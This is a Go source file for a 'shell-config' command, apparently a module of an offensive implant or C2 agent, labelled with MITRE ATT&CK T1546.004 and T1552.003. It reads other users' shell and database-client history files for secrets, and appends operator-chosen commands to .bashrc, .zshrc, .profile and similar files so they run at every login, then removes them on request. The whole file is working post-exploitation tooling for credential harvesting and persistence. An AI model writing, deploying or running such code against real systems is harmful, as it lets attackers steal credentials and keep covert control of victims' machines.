//go:build !windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type ShellConfigCommand struct{}

func (c *ShellConfigCommand) Name() string { return "shell-config" }
func (c *ShellConfigCommand) Description() string {
	return "Read shell history, list/read/inject/remove shell config files (T1546.004, T1552.003)"
}

type shellConfigArgs struct {
	Action  string `json:"action"`
	File    string `json:"file"`
	Line    string `json:"line"`
	User    string `json:"user"`
	Lines   int    `json:"lines"`
	Comment string `json:"comment"`
}

// Shell history files to check
var shellHistoryFiles = []string{
	".bash_history",
	".zsh_history",
	".sh_history",
	".history",
	".python_history",
	".mysql_history",
	".psql_history",
	".node_repl_history",
}

// Shell config files to check
var shellConfigFiles = []string{
	".bashrc",
	".bash_profile",
	".bash_login",
	".profile",
	".zshrc",
	".zprofile",
	".zshenv",
	".zlogin",
}

// System-wide config files
var systemConfigFiles = []string{
	"/etc/profile",
	"/etc/bash.bashrc",
	"/etc/bashrc",
	"/etc/zshrc",
	"/etc/zsh/zshrc",
	"/etc/zsh/zprofile",
	"/etc/environment",
}

func (c *ShellConfigCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: history, list, read, inject, remove",
			Status:    "error",
			Completed: true,
		}
	}

	var args shellConfigArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "history":
		return shellHistory(args)
	case "list":
		return shellList(args)
	case "read":
		return shellRead(args)
	case "inject":
		return shellInject(args)
	case "remove":
		return shellRemove(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: history, list, read, inject, remove", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func getHomeDir(targetUser string) (string, error) {
	if targetUser != "" {
		u, err := user.Lookup(targetUser)
		if err != nil {
			return "", fmt.Errorf("cannot find user %s: %v", targetUser, err)
		}
		return u.HomeDir, nil
	}
	u, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("cannot determine current user: %v", err)
	}
	return u.HomeDir, nil
}

func shellHistory(args shellConfigArgs) structs.CommandResult {
	homeDir, err := getHomeDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error: %v", err),
			Status: "error", Completed: true,
		}
	}

	maxLines := args.Lines
	if maxLines < 1 {
		maxLines = 100
	}

	var sb strings.Builder
	found := 0

	for _, histFile := range shellHistoryFiles {
		path := filepath.Join(homeDir, histFile)
		content, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		lines := strings.Split(strings.TrimRight(string(content), "\n"), "\n")
		found++

		sb.WriteString(fmt.Sprintf("=== %s (%d lines total) ===\n", path, len(lines)))

		// Show last N lines
		start := 0
		if len(lines) > maxLines {
			start = len(lines) - maxLines
			sb.WriteString(fmt.Sprintf("(showing last %d lines)\n", maxLines))
		}
		for i := start; i < len(lines); i++ {
			sb.WriteString(lines[i] + "\n")
		}
		sb.WriteString("\n")
	}

	if found == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No shell history files found in %s", homeDir),
			Status:    "success",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func shellList(args shellConfigArgs) structs.CommandResult {
	homeDir, err := getHomeDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error: %v", err),
			Status: "error", Completed: true,
		}
	}

	var sb strings.Builder

	// User config files
	sb.WriteString(fmt.Sprintf("Shell Config Files (%s)\n", homeDir))
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	count := 0
	for _, f := range shellConfigFiles {
		path := filepath.Join(homeDir, f)
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		count++
		sb.WriteString(fmt.Sprintf("  [%d] %s (%d bytes)\n", count, path, info.Size()))
	}
	if count == 0 {
		sb.WriteString("  (none found)\n")
	}

	// History files
	sb.WriteString(fmt.Sprintf("\nShell History Files (%s)\n", homeDir))
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	histCount := 0
	for _, f := range shellHistoryFiles {
		path := filepath.Join(homeDir, f)
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		histCount++
		lineCount := 0
		if content, err := os.ReadFile(path); err == nil {
			lineCount = strings.Count(string(content), "\n")
		}
		sb.WriteString(fmt.Sprintf("  [%d] %s (%d bytes, ~%d lines)\n", histCount, path, info.Size(), lineCount))
	}
	if histCount == 0 {
		sb.WriteString("  (none found)\n")
	}

	// System config files
	sb.WriteString("\nSystem-wide Config Files\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	sysCount := 0
	for _, path := range systemConfigFiles {
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		sysCount++
		sb.WriteString(fmt.Sprintf("  [%d] %s (%d bytes)\n", sysCount, path, info.Size()))
	}
	if sysCount == 0 {
		sb.WriteString("  (none found)\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func shellRead(args shellConfigArgs) structs.CommandResult {
	if args.File == "" {
		return structs.CommandResult{
			Output: "Error: file parameter required (e.g., .bashrc, .zshrc, /etc/profile)",
			Status: "error", Completed: true,
		}
	}

	path := args.File
	// If relative path, resolve against home directory
	if !filepath.IsAbs(path) {
		homeDir, err := getHomeDir(args.User)
		if err != nil {
			return structs.CommandResult{
				Output: fmt.Sprintf("Error: %v", err),
				Status: "error", Completed: true,
			}
		}
		path = filepath.Join(homeDir, path)
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error reading %s: %v", path, err),
			Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("=== %s (%d bytes) ===\n%s", path, len(content), string(content)),
		Status:    "success",
		Completed: true,
	}
}

func shellInject(args shellConfigArgs) structs.CommandResult {
	if args.File == "" {
		return structs.CommandResult{
			Output: "Error: file parameter required (e.g., .bashrc, .zshrc, .profile)",
			Status: "error", Completed: true,
		}
	}
	if args.Line == "" {
		return structs.CommandResult{
			Output: "Error: line parameter required (command to inject)",
			Status: "error", Completed: true,
		}
	}

	path := args.File
	if !filepath.IsAbs(path) {
		homeDir, err := getHomeDir(args.User)
		if err != nil {
			return structs.CommandResult{
				Output: fmt.Sprintf("Error: %v", err),
				Status: "error", Completed: true,
			}
		}
		path = filepath.Join(homeDir, path)
	}

	// Build the line to inject
	line := args.Line
	if args.Comment != "" {
		line = line + " # " + args.Comment
	}

	// Read existing content to check if already present
	existing, _ := os.ReadFile(path)
	if strings.Contains(string(existing), line) {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Line already exists in %s — skipping injection", path),
			Status:    "success",
			Completed: true,
		}
	}

	// Append to file
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error opening %s: %v", path, err),
			Status: "error", Completed: true,
		}
	}
	defer f.Close()

	// Ensure newline before our injection
	if len(existing) > 0 && existing[len(existing)-1] != '\n' {
		line = "\n" + line
	}
	line = line + "\n"

	if _, err := f.WriteString(line); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error writing to %s: %v", path, err),
			Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Injected into %s:\n  %s", path, strings.TrimSpace(line)),
		Status:    "success",
		Completed: true,
	}
}

func shellRemove(args shellConfigArgs) structs.CommandResult {
	if args.File == "" {
		return structs.CommandResult{
			Output: "Error: file parameter required",
			Status: "error", Completed: true,
		}
	}
	if args.Line == "" {
		return structs.CommandResult{
			Output: "Error: line parameter required (exact line to remove)",
			Status: "error", Completed: true,
		}
	}

	path := args.File
	if !filepath.IsAbs(path) {
		homeDir, err := getHomeDir(args.User)
		if err != nil {
			return structs.CommandResult{
				Output: fmt.Sprintf("Error: %v", err),
				Status: "error", Completed: true,
			}
		}
		path = filepath.Join(homeDir, path)
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error reading %s: %v", path, err),
			Status: "error", Completed: true,
		}
	}

	lines := strings.Split(string(content), "\n")
	var newLines []string
	removed := 0
	for _, l := range lines {
		if strings.TrimSpace(l) == strings.TrimSpace(args.Line) ||
			strings.Contains(l, args.Line) {
			removed++
			continue
		}
		newLines = append(newLines, l)
	}

	if removed == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Line not found in %s", path),
			Status:    "success",
			Completed: true,
		}
	}

	if err := os.WriteFile(path, []byte(strings.Join(newLines, "\n")), 0644); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error writing %s: %v", path, err),
			Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Removed %d line(s) from %s", removed, path),
		Status:    "success",
		Completed: true,
	}
}
